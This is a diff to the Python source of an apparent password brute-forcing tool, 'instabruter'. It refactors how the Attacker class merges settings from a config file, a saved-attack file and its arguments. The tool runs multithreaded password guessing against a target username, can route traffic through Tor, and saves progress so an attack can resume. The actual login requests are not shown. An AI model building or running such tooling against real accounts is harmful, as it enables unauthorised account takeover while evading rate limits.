@@ -38,7 +38,7 @@ class Bruter(threading.Thread):
         # self.__notifier = notifier
         
         # parse config (if you want to add any config, do it here):
-        self.__use_tor = config['use_tor']
+        self.__use_tor = False if config['use_tor'] == '0' else True
         if self.__use_tor:
             self.__tor_hostname = config['torhostname']
             self.__tor_control_port = int(config['torcontrolport'])
@@ -167,48 +167,46 @@ class Bruter(threading.Thread):
         self.__running = False
 
 class Attacker():
-    def __init__(self, username, passlist, **kwargs):
-        # defaults
-        self.__thread_count = 1
-        self.__use_tor = False
-        self.__username = username
-        self.__passlist = passlist
-        self.__total_scanned = 0
+    def __init__(self, config, **kwargs):
+        # all the config goes here:
         self.__config = {}
 
-        if 'continue_attack_config' in kwargs:
-            # open continue_attack file and parse it
-            with open(file = kwargs['continue_attack_config'], mode = 'r') as continue_attack_file:
-                config = json.load(fp = continue_attack_file)
-                
-                self.__username = config['username']
-                self.__passlist = config['passlist']
-                self.__thread_count = config['thread_count']
-                self.__total_scanned = config['total_scanned']
-                self.__use_tor = self.__config['use_tor'] = config['use_tor']
-                self.__config['torhostname'] = config['torhostname']
-                self.__config['torsocksport'] = config['torsocksport']
-                self.__config['torcontrolport'] = config['torcontrolport']
-                self.__config['torcontrolportpassword'] = config['torcontrolportpassword']
-
-            print(' ==> Continuing attack')
-        else:
-            # parse the config
-            with open(file = 'instabruter.conf', mode = 'r') as config_file:
-                for line in config_file:
-                    line = line.split(' ')
-                    if len(line) != 2:
-                        continue
-                    key, value = line[0].lower(), line[1][:-1] # should remove the \n at the end of the line
-                    # extract needed configs
-                    if key == 'threadcount':
-                        self.__thread_count = int(value)
-                    elif key == 'usetor':
-                        self.__use_tor = False if value == '0' else True
-                        # re-add it, as bruters need it too
-                        self.__config['use_tor'] = self.__use_tor
+        # first, read config file:
+        self.__config_file = config.get('config_file', 'instabruter.conf')
+        with open(file = self.__config_file, mode = 'r') as config_file:
+            for line in config_file:
+                parsed_line = line[:-1].split(' ') # [:-1] : for removing the \n from end of `line`
+                if len(parsed_line) != 2: # not a normal line, lets just ignore it
+                    continue
+                self.__config[parsed_line[0]] = parsed_line[1]
+        
+        # then, read the saved attack file, if any:
+        self.__saved_attack_file = config.get('saved_scan_file', None)
+        if self.__saved_attack_file != None:
+            with open(file = self.__saved_attack_file, mode = 'r') as saved_scan_file:
+                saved_attack_config = json.load(fp = saved_scan_file)
+                # update, only if the new value is NOT None:
+                for key in saved_attack_config:
+                    if key not in self.__config:
+                        self.__config[key] = saved_attack_config[key]
                     else:
-                        self.__config[key] = value
+                        if saved_attack_config[key] != None:
+                            self.__config[key] = saved_attack_config[key]
+        
+        # and at last, parse the config, passed to __init__:
+        # update, only if the new value is NOT None:
+        for key in config:
+                if key not in self.__config:
+                    self.__config[key] = config[key]
+                else:
+                    if config[key] != None:
+                        self.__config[key] = config[key]
+        
+
+
+        self.__passlist = self.__config['passlist']
+        self.__thread_count = int(self.__config.get('thread_count', 8))
+        self.__total_scanned = int(self.__config.get('total_scanned', 0))
 
         # count the number of lines of passlist file
         with open(file = self.__passlist, mode = 'r') as passlist_file:
@@ -221,14 +219,12 @@ class Attacker():
         for i in range(self.__total_scanned):
             self.__passlist_file.readline()
         
-        
-        
         # keeps a list of bruter objects
         self.__bruters = []
 
-    @classmethod
-    def continue_attack(cls, config_file):
-        return cls(None, None, continue_attack_config = config_file)
+    # @classmethod
+    # def continue_attack(cls, config_file):
+        # return cls(None, None, continue_attack_config = config_file)
         
 
     def start(self):
@@ -248,18 +244,18 @@ class Attacker():
                     int((self.__total_scanned / self.__passlist_lines_count) * 10000) / 100
                 ), end = '')
                 cur_status = {
-                    'username' : self.__username,
+                    'username' : self.__config['username'],
                     'passlist' : self.__passlist,
                     'thread_count' : self.__thread_count,
                     'total_scanned' : self.__total_scanned,
-                    'use_tor' : self.__use_tor,
+                    'use_tor' : self.__config['use_tor'],
                     'torhostname' : self.__config['torhostname'],
                     'torsocksport' : self.__config['torsocksport'],
                     'torcontrolport' : self.__config['torcontrolport'],
                     'torcontrolportpassword' : self.__config['torcontrolportpassword']
                 }
                 cur_status = json.dumps(cur_status)
-                with open(file = '%s.isb' % self.__username, mode = 'w') as continue_attack_file:
+                with open(file = '%s.isb' % self.__config['username'], mode = 'w') as continue_attack_file:
                     continue_attack_file.write(cur_status)
 
         def on_error(error_code):
@@ -270,13 +266,13 @@ class Attacker():
             pass
         
         for i in range(self.__thread_count):
-            bruter = Bruter(self.__username, self.__passlist_file, self.__config, on_success, on_error, i + 1)
+            bruter = Bruter(self.__config['username'], self.__passlist_file, self.__config, on_success, on_error, i + 1)
             self.__bruters.append(bruter)
             bruter.start()
             print(' ==> Starting thread: %s/%s\r' % (i + 1, self.__thread_count), end = '')
 
         print()        
-        print(' ==> Starting attack for %s' % self.__username)
+        print(' ==> Starting attack for %s' % self.__config['username'])
     
     def stop(self):
         for bruter in self.__bruters:
